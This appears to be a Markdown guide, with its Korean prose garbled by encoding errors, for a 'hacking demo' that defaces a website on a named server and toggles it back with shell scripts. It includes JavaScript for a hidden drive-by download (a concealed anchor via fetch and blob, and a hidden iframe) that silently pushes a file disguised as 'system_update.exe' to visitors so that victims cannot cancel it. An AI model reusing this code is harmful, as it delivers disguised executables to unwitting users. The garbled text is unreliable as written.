# ê°œì„ ëœ í•´í‚¹ ë°ëª¨ ìŠ¤í¬ë¦½íŠ¸ ì‚¬ìš© ê°€ì´ë“œ

## ë¬¸ì œì  í•´ê²°

### ê¸°ì¡´ ë¬¸ì œ
1. **íŒŒì¼ ë‹¤ìš´ë¡œë“œ ê²½ë¡œ ë¬¸ì œ**: í”¼í•´ìê°€ íŒŒì¼ ê²½ë¡œë¥¼ ë¬¼ì–´ë³´ëŠ” ì°½ì´ ë– ì„œ ë‹¤ìš´ë¡œë“œë¥¼ ì·¨ì†Œí•  ìˆ˜ ìˆìŒ
2. **ì‚¬ì´íŠ¸ ì „í™˜ ë¬¸ì œ**: ì •ìƒ/í•´í‚¹ ì‚¬ì´íŠ¸ ì „í™˜ ì‹œ ì´ìƒí•œ ì‚¬ì´íŠ¸ë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸ë˜ê±°ë‚˜ ìˆ˜ë™ ë³µêµ¬ í•„ìš”

### í•´ê²° ë°©ë²•
âœ… **ì™„ì „ ìë™ ë‹¤ìš´ë¡œë“œ**: ê²½ë¡œë¥¼ ë¬»ì§€ ì•Šê³  ìë™ìœ¼ë¡œ ë‹¤ìš´ë¡œë“œ í´ë”ì— ì €ì¥
âœ… **ê¹”ë”í•œ í† ê¸€**: í•œ ëª…ë ¹ì–´ë¡œ ì •ìƒ â†” í•´í‚¹ ì‚¬ì´íŠ¸ ì „í™˜
âœ… **ìºì‹œ ë¬¸ì œ í•´ê²°**: Apache ì¬ì‹œì‘ìœ¼ë¡œ ì¦‰ì‹œ ë°˜ì˜

---

## ìƒˆë¡œìš´ ìŠ¤í¬ë¦½íŠ¸

### 1. IMPROVED_DEFACE.sh
**ëª©ì **: ì›¹ì‚¬ì´íŠ¸ ë³€ì¡° + ìë™ ì•…ì„±ì½”ë“œ ë‹¤ìš´ë¡œë“œ

**íŠ¹ì§•**:
- ì™„ì „íˆ ìˆ¨ê²¨ì§„ ìë™ ë‹¤ìš´ë¡œë“œ (ê²½ë¡œ ì•ˆë¬¼ì–´ë´„)
- 5ì´ˆ í›„ ìë™ìœ¼ë¡œ system_update.exe ë‹¤ìš´ë¡œë“œ
- ì‚¬ìš©ìëŠ” ì•Œë¦¼ ì—†ì´ ë‹¤ìš´ë¡œë“œë¨
- ì›ë³¸ ì‚¬ì´íŠ¸ ìë™ ë°±ì—…

**ì‚¬ìš©ë²•**:
```bash
# ì„œë²„ì— ì—…ë¡œë“œ
scp -i ~/.ssh/id_rsa IMPROVED_DEFACE.sh ec2-user@52.79.240.83:/tmp/

# ì„œë²„ì—ì„œ ì‹¤í–‰
ssh -i ~/.ssh/id_rsa ec2-user@52.79.240.83
sudo bash /tmp/IMPROVED_DEFACE.sh
```

**ê²°ê³¼**:
- í•´í‚¹ í˜ì´ì§€ í‘œì‹œ
- 5ì´ˆ í›„ ìë™ ë‹¤ìš´ë¡œë“œ ì‹œì‘ (ìˆ¨ê¹€)
- ë¸Œë¼ìš°ì € ë‹¤ìš´ë¡œë“œ í´ë”ì— `system_update.exe` ìƒì„±

---

### 2. CLEAN_RESTORE.sh
**ëª©ì **: ì›ë³¸ ì‚¬ì´íŠ¸ë¡œ ì™„ë²½ ë³µêµ¬

**íŠ¹ì§•**:
- ë°±ì—…ëœ ì›ë³¸ íŒŒì¼ë¡œ ì™„ì „ ë³µêµ¬
- Apache ì¬ì‹œì‘ìœ¼ë¡œ ìºì‹œ ì œê±°
- ê¶Œí•œ ìë™ ì„¤ì •

**ì‚¬ìš©ë²•**:
```bash
# ì„œë²„ì— ì—…ë¡œë“œ
scp -i ~/.ssh/id_rsa CLEAN_RESTORE.sh ec2-user@52.79.240.83:/tmp/

# ì„œë²„ì—ì„œ ì‹¤í–‰
sudo bash /tmp/CLEAN_RESTORE.sh
```

**ê²°ê³¼**:
- ì›ë³¸ ì‚¬ì´íŠ¸ë¡œ ì™„ì „ ë³µêµ¬
- ìºì‹œ ë¬¸ì œ ì—†ìŒ
- ì¦‰ì‹œ ì •ìƒ ì‚¬ì´íŠ¸ í™•ì¸ ê°€ëŠ¥

---

### 3. PERFECT_TOGGLE.sh (â­ ê°€ì¥ í¸ë¦¬)
**ëª©ì **: ì •ìƒ â†” í•´í‚¹ ì‚¬ì´íŠ¸ í† ê¸€ (í•œ ëª…ë ¹ì–´ë¡œ)

**íŠ¹ì§•**:
- í˜„ì¬ ìƒíƒœ ìë™ ê°ì§€
- í•œ ë²ˆ ì‹¤í–‰í•˜ë©´ ë°˜ëŒ€ ìƒíƒœë¡œ ì „í™˜
- ë°±ì—… ìë™ ê´€ë¦¬
- Apache ì¬ì‹œì‘ìœ¼ë¡œ ì¦‰ì‹œ ë°˜ì˜

**ì‚¬ìš©ë²•**:
```bash
# ì„œë²„ì— ì—…ë¡œë“œ
scp -i ~/.ssh/id_rsa PERFECT_TOGGLE.sh ec2-user@52.79.240.83:/tmp/

# ì„œë²„ì—ì„œ ì‹¤í–‰ (í† ê¸€)
sudo bash /tmp/PERFECT_TOGGLE.sh

# ë‹¤ì‹œ ì‹¤í–‰í•˜ë©´ ë°˜ëŒ€ë¡œ ì „í™˜
sudo bash /tmp/PERFECT_TOGGLE.sh
```

**ê²°ê³¼**:
```
ì •ìƒ ì‚¬ì´íŠ¸ â†’ ì‹¤í–‰ â†’ í•´í‚¹ ì‚¬ì´íŠ¸
í•´í‚¹ ì‚¬ì´íŠ¸ â†’ ì‹¤í–‰ â†’ ì •ìƒ ì‚¬ì´íŠ¸
```

---

## ì‚¬ìš© ì‹œë‚˜ë¦¬ì˜¤

### ì‹œë‚˜ë¦¬ì˜¤ 1: ë°ëª¨ ì¤€ë¹„
```bash
# 1. ì„œë²„ì— íŒŒì¼ ì—…ë¡œë“œ
scp -i ~/.ssh/id_rsa IMPROVED_DEFACE.sh ec2-user@52.79.240.83:/tmp/
scp -i ~/.ssh/id_rsa PERFECT_TOGGLE.sh ec2-user@52.79.240.83:/tmp/

# 2. í•´í‚¹ ì‚¬ì´íŠ¸ë¡œ ë³€ì¡°
ssh -i ~/.ssh/id_rsa ec2-user@52.79.240.83
sudo bash /tmp/IMPROVED_DEFACE.sh

# 3. ë¸Œë¼ìš°ì €ë¡œ í™•ì¸
# http://52.79.240.83 ì ‘ì†
# â†’ í•´í‚¹ í˜ì´ì§€ í‘œì‹œ
# â†’ 5ì´ˆ í›„ ìë™ ë‹¤ìš´ë¡œë“œ (ìˆ¨ê¹€)

# 4. ë°ëª¨ í›„ ë³µêµ¬
sudo bash /tmp/PERFECT_TOGGLE.sh
```

### ì‹œë‚˜ë¦¬ì˜¤ 2: ë°˜ë³µ ë°ëª¨
```bash
# SSH ì ‘ì†
ssh -i ~/.ssh/id_rsa ec2-user@52.79.240.83

# í† ê¸€ë¡œ ì‰½ê²Œ ì „í™˜
sudo bash /tmp/PERFECT_TOGGLE.sh  # í•´í‚¹ ì‚¬ì´íŠ¸
sudo bash /tmp/PERFECT_TOGGLE.sh  # ì •ìƒ ì‚¬ì´íŠ¸
sudo bash /tmp/PERFECT_TOGGLE.sh  # í•´í‚¹ ì‚¬ì´íŠ¸
```

---

## ê¸°ìˆ ì  ì„¸ë¶€ì‚¬í•­

### ìë™ ë‹¤ìš´ë¡œë“œ ì›ë¦¬

#### Method 1: Fetch API + Blob
```javascript
fetch('/downloads/system_update.exe')
    .then(response => response.blob())
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.style.display = 'none';  // ì™„ì „íˆ ìˆ¨ê¹€
        a.href = url;
        a.download = 'system_update.exe';
        document.body.appendChild(a);
        a.click();  // ìë™ í´ë¦­
        document.body.removeChild(a);
    });
```

**ì¥ì **:
- ê²½ë¡œë¥¼ ë¬»ì§€ ì•ŠìŒ
- ë¸Œë¼ìš°ì € ê¸°ë³¸ ë‹¤ìš´ë¡œë“œ í´ë”ì— ì €ì¥
- ì™„ì „íˆ ë³´ì´ì§€ ì•ŠìŒ

#### Method 2: Hidden iframe (ë°±ì—…)
```javascript
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = '/downloads/system_update.exe';
document.body.appendChild(iframe);
```

**ì¥ì **:
- Fetch ì‹¤íŒ¨ ì‹œ ë°±ì—…
- ë” ì€ë°€í•¨

### í† ê¸€ ì›ë¦¬

```bash
# í˜„ì¬ ìƒíƒœ í™•ì¸
if grep -q "SYSTEM COMPROMISED" "$INDEX_FILE"; then
    CURRENT_STATE="HACKED"
else
    CURRENT_STATE="NORMAL"
fi

# ìƒíƒœì— ë”°ë¼ ì „í™˜
if [ "$CURRENT_STATE" = "HACKED" ]; then
    cp "$BACKUP_NORMAL" "$INDEX_FILE"  # ì •ìƒìœ¼ë¡œ
else
    cp "$BACKUP_HACKED" "$INDEX_FILE"  # í•´í‚¹ìœ¼ë¡œ
fi

systemctl restart httpd  # ìºì‹œ ì œê±°
```

---

## ì£¼ì˜ì‚¬í•­

### ë¸Œë¼ìš°ì € ìºì‹œ
- Ctrl+F5 (ê°•ì œ ìƒˆë¡œê³ ì¹¨) ê¶Œì¥
- ë˜ëŠ” ì‹œí¬ë¦¿ ëª¨ë“œ ì‚¬ìš©

### ê¶Œí•œ ë¬¸ì œ
- ëª¨ë“  ìŠ¤í¬ë¦½íŠ¸ëŠ” `sudo`ë¡œ ì‹¤í–‰ í•„ìš”
- Apache ì¬ì‹œì‘ ê¶Œí•œ í•„ìš”

### ë°±ì—… ê´€ë¦¬
- IMPROVED_DEFACE.sh: `/tmp/site_backup_*` ìƒì„±
- PERFECT_TOGGLE.sh: `/tmp/index_NORMAL.php`, `/tmp/index_HACKED.php` ì‚¬ìš©

---

## ë¬¸ì œ í•´ê²°

### Q: ë‹¤ìš´ë¡œë“œê°€ ì•ˆë¨
**A**:
1. ë¸Œë¼ìš°ì € ì½˜ì†” í™•ì¸ (F12)
2. `/downloads/system_update.exe` íŒŒì¼ í™•ì¸
3. Apache ë¡œê·¸ í™•ì¸: `tail -f /var/log/httpd/error_log`

### Q: ì‚¬ì´íŠ¸ê°€ ì „í™˜ ì•ˆë¨
**A**:
1. Apache ìƒíƒœ í™•ì¸: `systemctl status httpd`
2. ê¶Œí•œ í™•ì¸: `ls -la /var/www/html/www/index.php`
3. ê°•ì œ ìƒˆë¡œê³ ì¹¨: Ctrl+F5

### Q: ë°±ì—…ì„ ëª» ì°¾ìŒ
**A**:
```bash
# ë°±ì—… ìœ„ì¹˜ í™•ì¸
ls -la /tmp/site_backup_*
ls -la /tmp/index_*.php

# ìˆ˜ë™ ë³µêµ¬
sudo cp /tmp/index_NORMAL.php /var/www/html/www/index.php
sudo systemctl restart httpd
```

---

## ê¸°ì¡´ ìŠ¤í¬ë¦½íŠ¸ì™€ ë¹„êµ

| ê¸°ëŠ¥ | ê¸°ì¡´ | ê°œì„ ë¨ |
|------|------|--------|
| ë‹¤ìš´ë¡œë“œ | ê²½ë¡œ ë¬¼ì–´ë´„ âŒ | ìë™ ë‹¤ìš´ë¡œë“œ âœ… |
| ì‚¬ì´íŠ¸ ì „í™˜ | ìˆ˜ë™ ë³µêµ¬ í•„ìš” âŒ | í•œ ëª…ë ¹ì–´ë¡œ í† ê¸€ âœ… |
| ìºì‹œ ë¬¸ì œ | ìì£¼ ë°œìƒ âŒ | ìë™ í•´ê²° âœ… |
| ë°±ì—… ê´€ë¦¬ | ìˆ˜ë™ âŒ | ìë™ âœ… |
| ì‚¬ìš© í¸ì˜ì„± | ë³µì¡í•¨ âŒ | ë§¤ìš° ê°„ë‹¨ âœ… |

---

## ê²°ë¡ 

ì´ì œ ë‹¤ìŒê³¼ ê°™ì´ ì‚¬ìš©í•˜ì„¸ìš”:

```bash
# ë°ëª¨ ì‹œì‘
sudo bash /tmp/PERFECT_TOGGLE.sh  # â†’ í•´í‚¹ ì‚¬ì´íŠ¸

# ë°ëª¨ ì¢…ë£Œ
sudo bash /tmp/PERFECT_TOGGLE.sh  # â†’ ì •ìƒ ì‚¬ì´íŠ¸
```

**ë!** ğŸ‰
